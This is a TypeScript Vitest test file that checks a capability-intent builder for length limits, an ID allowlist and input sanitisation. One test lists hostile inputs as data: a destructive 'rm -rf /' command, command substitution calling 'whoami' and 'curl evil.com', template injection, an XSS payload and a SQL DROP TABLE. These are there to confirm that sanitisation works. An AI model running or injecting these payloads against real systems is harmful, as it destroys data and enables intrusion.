import { describe, expect, it } from 'vitest';
import { capabilityIntent, isSafeCapabilityId } from '../../../src/shared/api/capabilityTypes';

describe('capabilityIntent — injection-safe and bounded', () => {
  it('returns a bounded intent for a known stable id', () => {
    const intent = capabilityIntent('crossing', 'Pedestrian crossing');
    expect(intent.length).toBeGreaterThan(0);
    expect(intent.length).toBeLessThanOrEqual(64);
    expect(intent).toContain('crossing');
    expect(intent).not.toMatch(/scenario_ir|scenic_source/i);
  });

  it('enforces safe capability ID pattern and canonical allowlist', () => {
    // A pattern-shaped but non-canonical ID is rejected by the pinned registry
    // allowlist and cannot be carried into the intent.
    expect(isSafeCapabilityId('crossing')).toBe(true);
    expect(isSafeCapabilityId('overtake')).toBe(true);
    expect(isSafeCapabilityId('not-a-known-id')).toBe(false);
    expect(isSafeCapabilityId('CAPITAL')).toBe(false); // pattern fails (must start lowercase)
    expect(isSafeCapabilityId('api_key')).toBe(false); // not in allowlist
    // Intent with unknown id falls back to "unknown" and omits name
    const intentUnknown = capabilityIntent('not-a-known-id', 'Evil Name');
    expect(intentUnknown).toContain('unknown');
    expect(intentUnknown.length).toBeLessThanOrEqual(64);
  });

  it('hard caps at 64 chars even for max-length id and name', () => {
    const longId = 'a'.repeat(63); // max allowed pattern: starts with letter, 63 chars total (but not in allowlist, so will become unknown)
    // Use a known id that is long? The longest known is maybe "parked_vehicle_obstruction" (28). Use it plus long displayName.
    const longName = 'A'.repeat(128);
    const intent = capabilityIntent('crossing', longName);
    expect(intent.length).toBeLessThanOrEqual(64);
    // 128-char id should be rejected to unknown and still capped
    const intentLongId = capabilityIntent(longId, longName);
    expect(intentLongId.length).toBeLessThanOrEqual(64);
    expect(intentLongId).not.toContain(longId.slice(0, 10)); // should be unknown, not the long id
  });

  it('sanitizes metacharacters and injection payloads', () => {
    const payloads: Array<[string, string[]]> = [
      [`test"; rm -rf /; echo "`, ['rm -rf', 'echo']],
      [`$(whoami)`, ['whoami']],
      [`{{7*7}}`, ['7*7']],
      [`"><svg onload=alert(1)>`, ['svg', 'onload', 'alert']],
      [`'; DROP TABLE capabilities; --`, ['DROP TABLE', '--']],
      [`$(curl evil.com)`, ['curl', 'evil.com']],
      [`\n\t\r`, ['\n', '\t']],
      [`a"B'c\`d$e&f|g<h>i`, ['B\'c', '`d', '$e']],
    ];
    for (const [payload, forbiddenSubstrings] of payloads) {
      const intent = capabilityIntent('crossing', payload);
      expect(intent.length).toBeLessThanOrEqual(64);
      // Forbidden substrings from raw payload must not appear (sanitized)
      for (const needle of forbiddenSubstrings) {
        expect(intent).not.toContain(needle);
      }
      // No control chars
      expect(intent).not.toContain('\n');
      expect(intent).not.toContain('\t');
      expect(intent).not.toContain('\r');
      // Must still contain the safe id
      expect(intent).toContain('crossing');
      // Intent must not contain raw secret-shaped fragments like `whoami` etc handled above
    }
  });

  it('omits displayName when id is unsafe/unknown to avoid smuggling', () => {
    const intent = capabilityIntent('"; evil', 'Safe Name');
    // Should not contain the unsafe id or the name as raw
    expect(intent).toContain('unknown');
    expect(intent).not.toContain('evil');
    expect(intent).not.toContain(';');
  });

  it('produces deterministic, injection-safe output for 128-char name', () => {
    const name128 = 'x'.repeat(128) + `"; attack`;
    const intent = capabilityIntent('crossing', name128);
    expect(intent.length).toBeLessThanOrEqual(64);
    expect(intent).not.toContain('"');
    expect(intent).not.toContain(';');
    expect(intent).toContain('crossing');
  });
});
